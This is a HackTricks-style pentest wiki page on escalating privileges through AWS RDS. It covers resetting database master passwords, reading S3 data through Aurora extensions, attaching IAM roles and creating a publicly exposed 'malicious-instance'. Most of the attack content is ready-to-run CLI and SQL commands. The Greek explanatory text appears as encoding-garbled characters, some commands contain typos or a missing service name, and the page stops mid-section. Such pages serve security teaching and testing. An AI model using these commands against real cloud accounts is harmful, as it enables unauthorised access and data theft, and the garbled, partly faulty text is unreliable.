# AWS - RDS Privesc

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ ÎºÎ±Î¹ ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}

## RDS - Relational Database Service

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ RDS ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../aws-services/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

ÎœÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÏÏÎ¹Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·**, ÎºÎ±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
Î˜Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ Î¼Îµ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼ÎµÏ‚ Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¬ Î´Î¯ÎºÏ„Ï…Î±).
{% endhint %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î•ÏÏÎµÏƒÎ· ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Ï‰Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¹Ï‚ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

### rds-db:connect

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î± [**Î­Î³Î³ÏÎ±Ï†Î±**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html) Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¼Îµ Ï„Î¿ DB instance.

### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· RDS Role IAM permissions

#### Postgresql (Aurora)

{% hint style="success" %}
Î‘Î½ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚ **`SELECT datname FROM pg_database;`** Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`rdsadmin`** Î¾Î­ÏÎµÏ„Îµ ÏŒÏ„Î¹ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± **AWS postgresql database**.
{% endhint %}

Î ÏÏÏ„Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Î±Ï…Ï„Î® Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î­Ï‡ÎµÎ¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± AWS. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÎºÎ¿Î¹Ï„Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½ÎµÏ‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚:
```sql
SELECT * FROM pg_extension;
```
Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ ÏƒÎ±Î½ **`aws_s3`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î­Ï‡ÎµÎ¹ **ÎºÎ¬Ï€Î¿Î¹Î¿ ÎµÎ¯Î´Î¿Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ S3** (Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎºÎ±Î¹ Î¬Î»Î»ÎµÏ‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ **`aws_ml`** ÎºÎ±Î¹ **`aws_lambda`**).

Î•Ï€Î¯ÏƒÎ·Ï‚, Î±Î½ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **`aws rds describe-db-clusters`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ Î¿ **cluster Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î¿ IAM Role ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿** ÏƒÏ„Î¿ Ï€ÎµÎ´Î¯Î¿ **`AssociatedRoles`**. Î‘Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î®Ï„Î±Î½ **Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¼Î­Î½Î· Î³Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¬Î»Î»ÎµÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ AWS**. Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ ÏƒÏ„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…** (Î® Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…) Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **Î¼Î±Î½Ï„Î­ÏˆÎµÏ„Îµ** Ï„Î¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î­Ï‡ÎµÎ¹ Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

Î¤ÏÏÎ±, Î³Î¹Î± Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ bucket** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î¼Îµ:
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
Î‘Î½ ÎµÎ¯Ï‡Î±Ï„Îµ **raw AWS credentials** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï„Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± S3 Î¼Îµ:
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Î¤Î¿ Postgresql **Î´ÎµÎ½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ ÎºÎ±Î¼Î¯Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï„Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½** Î³Î¹Î± Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ S3.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
ÎœÎ­ÏƒÎ± ÏƒÎµ Î­Î½Î± mysql, Î±Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î± **`SELECT User, Host FROM mysql.user;`** ÎºÎ±Î¹ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± **`rdsadmin`**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± **AWS RDS mysql db**.
{% endhint %}

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ mysql ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ **`show variables;`** ÎºÎ±Î¹ Î±Î½ Î¿Î¹ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÏŒÏ€Ï‰Ï‚ **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`**, Î­Ï‡Î¿Ï…Î½ Ï„Î¹Î¼Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î¸Î­ÏƒÎµÏ„Îµ ÏŒÏ„Î¹ Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¼Î­Î½Î· Î³Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´ÎµÎ´Î¿Î¼Î­Î½Î± S3.

Î•Ï€Î¯ÏƒÎ·Ï‚, Î±Î½ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **`aws rds describe-db-clusters`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï„Î¿ cluster Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î¿ **ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿**, Ï€Î¿Ï… ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ AWS.

Î¤ÏÏÎ±, Î³Î¹Î± Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± bucket** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ Ï€Î»Î®ÏÎµÏ‚ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î¼Îµ:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `rds:AddRoleToDBCluster` ÎºÎ±Î¹ `iam:PassRole` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î­Î½Î±Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿ ÏƒÎµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± RDS instance**. Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Î® Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ instance.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚**: Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½ÎµÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î·Î½ RDS instance.\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½ Ï€ÏÏŒÏƒÎ¸ÎµÏ„ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚, ÏŒÏ€Ï‰Ï‚ Î· Mysql, Î· Î¿Ï€Î¿Î¯Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎºÎ±Î¸Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿ role ARN ÏƒÏ„Î¹Ï‚ Î¿Î¼Î¬Î´ÎµÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÎµÏ€Î¯ÏƒÎ·Ï‚.

### `rds:CreateDBInstance`

ÎœÏŒÎ½Î¿ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± **Î½Î­Î± instance Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± cluster** Ï€Î¿Ï… Î®Î´Î· Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎºÎ±Î¹ Î­Ï‡ÎµÎ¹ Î­Î½Î± **IAM role** ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿. Î”ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± Î±Î»Î»Î¬Î¾ÎµÎ¹ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÏÏÎ¹Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± ÎµÎºÎ¸Î­ÏƒÎµÎ¹ Ï„Î· Î½Î­Î± database instance ÏƒÏ„Î¿ Î´Î¹Î±Î´Î¯ÎºÏ„Ï…Î¿:
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Î”Î¿ÎºÎ¹Î¼Î®
{% endhint %}

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `rds:CreateDBInstance` ÎºÎ±Î¹ `iam:PassRole` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼Î¹Î± Î½Î­Î± RDS instance Î¼Îµ Î­Î½Î±Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿**. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Î® Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ instance.

{% hint style="warning" %}
ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Ï€Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…/Ï€ÏÎ¿Ï†Î¯Î» instance Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ (Î±Ï€ÏŒ [**ÎµÎ´Ï**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* Î¤Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏƒÎ±Ï‚.
* Î¤Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Î­Î½Î±Î½ IAM ÏÏŒÎ»Î¿ Ï€Î¿Ï… Ï„Î¿ Amazon EC2 Î­Ï‡ÎµÎ¹ Î¬Î´ÎµÎ¹ÎµÏ‚ Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÎ¹.
* Î¤Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€ÏÎ¿Ï†Î¯Î» instance ÎºÎ±Î¹ Ï„Î¿ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿ ÏŒÎ½Î¿Î¼Î± IAM ÏÏŒÎ»Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¾ÎµÎºÎ¹Î½Î¿ÏÎ½ Î¼Îµ Ï„Î¿ Ï€ÏÏŒÎ¸ÎµÎ¼Î± `AWSRDSCustom`.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚**: Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î® Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½ÎµÏ‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î·Î½ RDS instance.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Îµ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ `rds:AddRoleToDBInstance` ÎºÎ±Î¹ `iam:PassRole` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î­Î½Î±Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿ ÏƒÎµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± RDS instance**. Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿ Î½Î± **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î±** Î® Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÎ½Ï„ÏŒÏ‚ Ï„Î·Ï‚ instance.

{% hint style="warning" %}
